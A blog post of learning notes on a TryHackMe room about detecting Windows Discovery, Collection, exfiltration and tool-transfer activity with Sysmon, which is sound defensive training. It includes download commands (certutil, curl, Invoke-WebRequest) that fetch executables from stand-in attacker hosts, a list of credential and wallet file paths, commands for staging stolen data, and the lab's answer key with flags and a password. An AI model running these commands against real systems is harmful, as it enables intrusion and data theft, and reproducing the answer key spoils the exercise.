---
layout: post
title: "TryHackMe  - Windows Threat Detection 2"
date: 2026-01-23
tags: ["learning", "notes", "tryhackme"]
categories: [tryhackme]
hubs: "TryHackMe/SOC Level 1/Windows Security Monitoring"
identifier: "20260123T000000"
source_urls: "(https://tryhackme.com/room/windowsthreatdetection2)"
source_path: "SOC Level 1/Windows Security Monitoring/20260123T000000--tryhackme-windows-threat-detection-2__learning_notes_tryhackme.md"
---


# TryHackMe | Windows Threat Detection 2

## Task 1 | Introduction

After breaching a host, threat actors are faced with a choice: quietly establish a backdoor to maintain long-term access or take immediate action to achieve their objectives. This room covers the second approach and continues your Windows threat detection journey by exploring what typically follows the Initial Access, beginning with Discovery and Collection.

 Learning Objectives 
- Detect common Discovery techniques using Windows Event Log
- Learn how to trace the attack origin by reconstructing a process tree
- Find out what data threat actors look for and how they exfiltrate it
- See how the malicious commands are logged by running them yourself

 Prerequisites 
- Recall the basics of [MITRE](https://tryhackme.com/room/mitre) tactics and [Windows](https://tryhackme.com/room/windowsloggingforsoc) logs
- Complete the previous room, [Windows Threat Detection 1](https://tryhackme.com/room/windowsthreatdetection1)
- Be ready to continue your Windows threat detection journey

 Lab Access Before moving forward, start the lab by clicking the **Start Machine**  button below. The VM will open in split view and will need about 2 minutes to fully load. In case the VM is not visible, you can click the**Show Split View**  button at the top of the page.

  Set up your virtual environmentTo successfully complete this room, you'll need to set up your virtual environment. This involves starting the Target Machine, ensuring you're equipped with the necessary tools and access to tackle the challenges ahead.

![Image 1](https://tryhackme.com/static/svg/target-machine.a3955286.svg)

Target machine

![Image 2](data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTciIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNyAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTguODI1MiAwQzQuNDA2NDUgMCAwLjgyNTE5NSAzLjU4MTI1IDAuODI1MTk1IDhDMC44MjUxOTUgMTIuNDE4NyA0LjQwNjQ1IDE2IDguODI1MiAxNkMxMy4yNDM5IDE2IDE2LjgyNTIgMTIuNDE4NyAxNi44MjUyIDhDMTYuODI1MiAzLjU4MTI1IDEzLjI0MzkgMCA4LjgyNTIgMFpNOC44MjUyIDRDOS4zNzczOCA0IDkuODI1MiA0LjQ0NzgxIDkuODI1MiA1QzkuODI1MiA1LjU1MjE5IDkuMzc3MzggNiA4LjgyNTIgNkM4LjI3MzAxIDYgNy44MjUyIDUuNTUzMTIgNy44MjUyIDVDNy44MjUyIDQuNDQ2ODggOC4yNzIwNyA0IDguODI1MiA0Wk0xMC4wNzUyIDEySDcuNTc1MkM3LjE2MjcgMTIgNi44MjUyIDExLjY2NTYgNi44MjUyIDExLjI1QzYuODI1MiAxMC44MzQ0IDcuMTYxMTMgMTAuNSA3LjU3NTIgMTAuNUg4LjA3NTJWOC41SDcuODI1MkM3LjQxMTEzIDguNSA3LjA3NTIgOC4xNjQwNiA3LjA3NTIgNy43NUM3LjA3NTIgNy4zMzU5NCA3LjQxMjcgNyA3LjgyNTIgN0g4LjgyNTJDOS4yMzkyNiA3IDkuNTc1MiA3LjMzNTk0IDkuNTc1MiA3Ljc1VjEwLjVIMTAuMDc1MkMxMC40ODkzIDEwLjUgMTAuODI1MiAxMC44MzU5IDEwLjgyNTIgMTEuMjVDMTAuODI1MiAxMS42NjQxIDEwLjQ5MDggMTIgMTAuMDc1MiAxMloiIGZpbGw9IiM4NzhGQTIiLz4KPC9zdmc+Cg==)

Status:OffStart Machine  Credentials

 Alternatively, you can access the VM from your own VPN-connected machine with the credentials below:

   Username    Administrator        Password    Secure!        IP address    MACHINE_IP        Connection via    RDP

### **Answer the questions below**

**Question:** 

*Answer:* 

     No answer needed

---

## Task 2 | Discovery Overview

Situational Awareness After the criminals pass through the front door, do they know what's behind the door? Most do not, so they will start searching the rooms: maybe there is a hidden treasure, but maybe a trap ready for action. Same for the cyber threat actors, who need to understand the environment, its value, and its security tools that can disrupt the attack. This process is mapped to the MITRE [Discovery](https://attack.mitre.org/tactics/TA0007/) tactic, which we will cover in this task.

 ![Image 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1749646696759.svg)

 Discovery Commands The first questions you may have once you wake up from a dream might be "Who am I?" and "Where am I?". The same is true for threat actors that might have sent thousands of phishing attachments to all emails they knew but managed to breach only a couple of systems they saw for the first time. So, they need to find out the victim's details:

    Discovery Purpose Common CMD / PowerShell Commands     **Files and Folders** 
(To find out the host purpose, victim's job, or their interests) `type <file>`, `Get-Content <file>`, `dir <folder>`, `Get-ChildItem <folder>`   **Users and Groups** 
(To find out who uses the host and with which privileges) `whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser`   **System and Apps** 
(To find out vulnerabilities or apps to steal data from) `tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service`   **Network Settings** 
(To find out if the host belongs to a corporate network) `ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles`   **Active Antivirus** 
(To find out how risky it is to continue the attack without being blocked) `Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"`    Discovery Process Recall the phishing attack chain from the previous room. After the attachment is launched, it runs basic discovery commands to identify the victim or even delete itself if a specific antivirus is installed or a victim is not from a targeted company or country. Then, it connects back to the threat actor, giving full control over the victim. From there, human attackers can type additional Discovery commands if required.

 **How Attackers Control the Victim**

 ![Image 4](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1748885199266.png)

  For this task, access the attached VM and try to run the Discovery commands yourself!

### **Answer the questions below**

**Question:** 

*Answer:* 

     Administrators

**Question:** 

*Answer:* 

     C:\Windows\System32\net.exe

---

## Task 3 | Detecting Discovery

Discovery via CMD Discovery via the command line is the most common and easiest method available for threat actors. This is because it simply uses the existing commands like "whoami" or "ipconfig" that are available on all Windows machines by default; check out [this article](https://thedfirreport.com/2024/08/26/blacksuit-ransomware/#collection:~:text=The%20threat%20actor%20performed%20several%20discovery%20commands) for a real-world attack example. Luckily for the defenders, most of the launched commands are logged as new processes, like on the process tree below:

   Discovery Commands Coming From "invoice.pdf.exe" 
```Discovery Commands Coming From "invoice.pdf.exe" 
C:\Users\victim\Downloads\invoice.pdf.exe
├── C:\Windows\System32\cmd.exe
│   ├── ipconfig                                 // Show network settings
│   ├── whoami /priv                             // Show user permissions
│   ├── dir                                      // List current directory
│   ├── net user                                 // List all local users
│   ├── tasklist /v                              // Show running processes
│   └── wmic computersystem get model            // Query for laptop model
└── C:\Windows\...\powershell.exe
    ├── Get-Service	                             // List active services
    └── Get-MpPreference                         // Check MS Defender settings
```

   Discovery via GUI In cases where threat actors log in to the system interactively, like after the RDP breach, they are not limited to console commands (but they often use them anyway as a habit). With access to the graphical interface, nothing prevents attackers from using the same toolkit as you do: Apps & Programs, System Settings, Disk Management, or even Event Viewer. In this scenario, you won't see typical "whoami" commands but rather a process tree that looks like this:

   Process Tree for GUI Discovery 
```Process Tree for GUI Discovery 
C:\Windows\System32\explorer.exe
├── C:\Windows\System32\cmd.exe                                   // Attacker can still use CMD!
│   └── ...
├── C:\Windows\system32\mmc.exe C:\Windows\system32\compmgmt.msc  // Open Computer Management
├── C:\Windows\system32\control.exe netconnections                // List network adapters
├── C:\Windows\ImmersiveControlPanel\SystemSettings.exe [...]     // Access settings panel
├── C:\Windows\system32\notepad.exe C:\...\secrets.txt            // Read a text file
└── C:\Windows\system32\taskmgr.exe                               // Run Task Manager
```

   Detecting Discovery The first task to detect a potential Discovery is to find a Discovery command, or better, a sequence of commands run during a short period of time. You will see them as process creation events tracked by Sysmon event ID 1 or as new rows in the PowerShell history file. There are [lots](https://cheatsheet.haax.fr/windows-systems/local-and-physical/local_recon_enumeration/) of Discovery commands, so be prepared to use the search engine if you are not sure what the command means.

 Next, it is important to find out where the commands are coming from. Commands like "ipconfig" are often used by IT departments and legitimate tools, and you don't want to create panic just because your coworker checked their IP. For this room, you can build the process tree using Sysmon logs: filter for process creation events and correlate ProcessId and ParentProcessId fields, like in the example below:

 ![Image 5](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1748890671175.svg)

  For this task, open the VM and run a phishing attachment sample located at:
**C:\Users\Administrator\Desktop\** **Practice\Task 3\invoice.pdf.exe**

### **Answer the questions below**

**Question:** 

*Answer:* 

     whoami

**Question:** 

*Answer:* 

     cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR"

**Question:** 

*Answer:* 

     exfil.beecz.cafe

---

## Task 4 | Collection Overview

Searching Secrets Continuing our scenario, what would the criminals do after they explored all rooms in the apartment, found out who the owner is, what valuables they hide, and what traps are in place? They grab the actual treasure - something that can be sold or is valuable for the threat actors. This process involves three more MITRE tactics: [Collection](https://attack.mitre.org/tactics/TA0009/), [Credential Access](https://attack.mitre.org/tactics/TA0006/), and [Exfiltration ](https://attack.mitre.org/tactics/TA0010/)(To make it simpler, let's treat Credential Access as a part of Collection).

 ![Image 6](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1749652833975.svg)

 Collection Targets The targets drastically differ depending on the attackers' goals. Some adversaries hunt personal info like images or chat conversations; others look for crypto wallets, gaming, or banking accounts; and advanced groups just use the victim to access the corporate network, hoping for a full-scale ransomware encryption.

 Note that while most of the sensitive data is stored as simple files, the secrets can also be hidden in the registry or in process memory. You can review the common Collection targets in the code block below:

 
```
# [Goal: Blackmail Victim] Photos, Chats, Browser History
C:\Users\<user>\AppData\Roaming\Signal\*
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History

# [Goal: Steal Money] Web Banking Sessions, Crypto Wallets
C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies

# [Goal: Steal Corporate Data] SSH Credentials, Databases
C:\Users\<user>\.ssh\*
C:\Program Files\Microsoft SQL Server\...\DATA\*
```

 Exfiltrating Data Data collection can be performed automatically via scripts or manually by human threat actors. For scripts, the whole process usually takes less than a minute, but it may take hours for the attacker to find and review the interesting files. Still, both methods should eventually end with exfiltration - uploading stolen data to a controller server. Here, threat actors can be very creative - to avoid detection, they often:

 
- Exfiltrate stolen data to DropBox, Mega, Amazon S3, or other trusted cloud storage services ([Examples](https://attack.mitre.org/techniques/T1567/002/#:~:text=Procedure%20Examples))
- Exfiltrate stolen data to known code repositories like GitHub or messengers like Telegram ([Example](https://cyberint.com/blog/research/the-new-infostealer-in-town-the-continental-stealer/#:~:text=offers%20a%20Telegram%20bot%20notification%20feature%20that%20informs%20users))
- Or just create a trustworthy-looking domain like "windows-updates.com" and send the data there

  For this task, continue with the attached VM and try to find the data to collect!

### **Answer the questions below**

**Question:** 

*Answer:* 

     nsAghv51BBav90!

**Question:** 

*Answer:* 

     thm-access-database.key

**Question:** 

*Answer:* 

     thm-network-diagram-2025.pdf

---

## Task 5 | Detecting Collection

Detecting Collection Same as with Discovery, threat actors can use both command-line and graphical interface options to review sensitive files. However, in Collection, threat actors don't just check a system configuration but rather look for specific files and folders shown in the previous task. Thus, you can detect access to the files by tracking commands like:

    Command Example Description   `notepad.exe C:\Users\<user>\Desktop\finances-2025.csv` Threat actors used Notepad to check content of the interesting file   CMD: `type debug-logs.txt | findstr password > C:\Temp\passwords.txt` Threat actors searched for the "password" keyword in a specific file   PowerShell: `Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf` Threat actors searched for PDF files in the user's home folder   PowerShell: `copy C:\Users\<user>\AppData\Roaming\Signal С:\Temp\` Threat actors copied Signal chat history to the Temp directory   PowerShell: `Compress-Archive С:\Temp\ С:\Temp\stolen_data.zip` Threat actors archived the stolen data, preparing for exfiltration   `7za.exe a -tzip C:\Temp\stolen_data.zip С:\\Temp\\*.*` Alternatively, threat actors can use the existing archiving software like 7-Zip    Collection Examples During manual collection or when using scripts, you will see basic commands and processes covered in the previous task. In [this incident](https://thedfirreport.com/2024/08/26/blacksuit-ransomware/#collection), threat actors simply used Notepad and Wordpad to open files of interest and then used 7-Zip to archive all files at once. As you may see from the screenshot, the actions were easily detected with Sysmon event ID 1:

 ![Image 7](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1749742989547.png)

*Manual collection of DOCX and TXT documents (thedfirreport.com)*

 **Data Stealers**

 Collection performed by human threat actors is typical for breaches of big networks, where the attacker knows their target and spends much time looking for data to steal. However, attacks targeting simple personal workstations rarely involve human attacker and data collection is performed by a data stealer - specialized malware to automate collection and exfiltration.

 For example, Gremlin data stealer, a single malicious file, steals VPN profiles, cryptocurrency wallets, web browser sessions, Steam, Discord, and Telegram data, and even takes screenshots of the victim's host. You can read the details in [this Unit42 blog post](https://unit42.paloaltonetworks.com/new-malware-gremlin-stealer-for-sale-on-telegram/). Note that data stealers rarely use CMD or PowerShell commands but rely on their own code, making it harder to understand which exact data was accessed or stolen:

 ![Image 8](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1749742989642.png)

*Data stealer function stealing Telegram sessions (unit42.paloaltonetworks.com)*

  For this task, run a simple data stealer sample and analyze its actions in logs:
**C:\Users\Administrator\Desktop\Practice\Task 5\stealer.exe**

### **Answer the questions below**

**Question:** 

*Answer:* 

     staging_58f1

**Question:** 

*Answer:* 

     docx, pdf, xlsx

**Question:** 

*Answer:* 

     Get-ClipBoard

**Question:** 

*Answer:* 

     collecteddata-storage-2025.s3.amazonaws.com

---

## Task 6 | Ingress Tool Transfer

Ingress Tool Transfer Recall the previous room explaining how attacks start: not from a fully functional malware, but from a tiny phishing attachment or from an RDP session without any red team tools. Thus, at some attack stages, threat actors may need to download more tools to achieve their goals, for example:

 
- A script to automate Discovery and find common vulnerabilities like [Seatbelt](https://github.com/GhostPack/Seatbelt)
- A tool to extract saved passwords or OS credentials like [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- A fully functional Remote Access Trojan (RAT) like [Remcos RAT](https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-malware/remcos-malware/)
- Finally, a ransomware binary to encrypt the system after the data is stolen

 The process of downloading additional malware to the breached system is mapped to the MITRE [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) technique, and it is used in the majority of breaches. You have already seen an example where a LNK attachment used PowerShell to download additional malware, but there are many other ways to transfer malware even without PowerShell!

 Common Transfer Methods Why can't the threat actors just include all they need into a single phishing attachment, you may ask. There can be different reasons, but the common ones are to bypass antivirus by splitting the malware into multiple parts and to minimize exposure of their tools/exploits in case they're caught right in the beginning.

    Ingress Tool Transfer Command Common CMD / PowerShell Commands     Via Certutil `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe`   Via Curl (Windows 10+) `curl.exe https://blackhat.thm/bad.exe -o good.exe`   Via PowerShell [IWR](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest) `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"`   Via Graphical Interface No need to use CMD, just copy-paste malware via RDP or download them via a web browser!    Detecting Tool Transfer Since a transfer requires a network connection, your best option would be to track a network connection or a DNS request from the suspicious process. Note, however, that threat actors often try to avoid detection by downloading the tools from legitimate services like GitHub, so make sure to analyze which process is making the connection, the destination domain, and the file being downloaded. The screenshot below shows a complete event chain:

 ![Image 9](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1749667313420.svg)

  For this task, continue with the VM and test the Ingress Tool Transfer yourself!
Use the URL [http://appsforfree.thm/trojan.exe](http://appsforfree.thm/trojan.exe) to answer the below questions.

### **Answer the questions below**

**Question:** 

*Answer:* 

     THM{just_use_web_browser}

**Question:** 

*Answer:* 

     THM{curl_is_cool}

**Question:** 

*Answer:* 

     THM{abusing_certutil}

**Question:** 

*Answer:* 

     THM{power_of_powershell}

---

## Task 7 | Conclusion

Congratulations on completing the room! It is hard work keeping all the stages and commands in mind, but knowing what happens after Initial Access is vital to hunt down the threat before it can cause a major impact.

 Key Takeaways 
- Discovery usually happens immediately after Initial Access and can be detected with Sysmon
- Discovery focuses on identifying the victim, but Collection focuses on acquiring sensitive data
- At any time of the attack, threat actors can exfiltrate the stolen data or download new malware
- Threat actors do not start with all the tools they need but download new malware only if necessary

### **Answer the questions below**

**Question:** 

*Answer:* 

     No answer needed

---
